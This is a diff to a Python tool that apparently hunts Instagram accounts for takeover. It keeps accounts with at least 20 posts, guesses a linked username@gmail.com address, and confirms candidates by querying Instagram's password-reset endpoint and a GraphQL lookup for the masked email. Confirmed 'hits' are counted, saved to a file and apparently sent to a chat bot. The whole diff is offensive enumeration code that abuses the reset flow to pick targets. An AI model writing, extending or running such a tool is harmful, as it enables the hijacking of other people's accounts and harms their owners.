@@ -1613,15 +1613,47 @@ def _m2_save_hit(username, user_data, token, chat_id):
         posts = int(user_data.get('media_count') or 0)
         if posts < 20:
             return
-        email       = f"{username}@gmail.com"
-        gmail_masked = _m2_get_masked(username)
+        email = f"{username}@gmail.com"
+
+        # Helper: real masked email or not
+        def _is_real_masked(v):
+            return bool(v and v not in ('-', '') and not v.startswith('Fail:') and '@' in v)
+
+        # PRIMARY CHECK: Instagram password-reset endpoint (by username)
+        reset_text      = _m1_rest_v1(username)
+        reset_confirmed = False
+        if _is_real_masked(reset_text):
+            if not _m1_masked_matches_username(username, reset_text):
+                return   # masked email from reset page does not match → skip
+            reset_confirmed = True
+
+        # SECONDARY CHECK: GraphQL masked email (by username)
+        gmail_masked      = _m2_get_masked(username)
+        graphql_confirmed = False
+        if gmail_masked:
+            if not _m1_masked_matches_username(username, gmail_masked):
+                return   # masked email from GraphQL does not match → skip
+            graphql_confirmed = True
+
+        # In M2, _m2_lookup already confirmed username@gmail.com is linked to an
+        # IG account (bloks search), so we allow the hit even when neither masked
+        # endpoint returned data. If either one DID return data it must match
+        # (checked above). This keeps M2 hits flowing while still blocking fakes.
+
+        # Build the best reset display value we have
+        if _is_real_masked(reset_text):
+            display_reset = reset_text
+        elif gmail_masked:
+            display_reset = gmail_masked
+        else:
+            display_reset = email
 
         with _m2_hit_lock:
             _m2_hits  += 1
             _m2_total += 1
             hit_num    = _m2_hits
 
-        msg = _m2_format_hit(hit_num, username, email, user_data, gmail_masked)
+        msg = _m2_format_hit(hit_num, username, email, user_data, display_reset)
 
         _save_hit_to_file(msg)
 
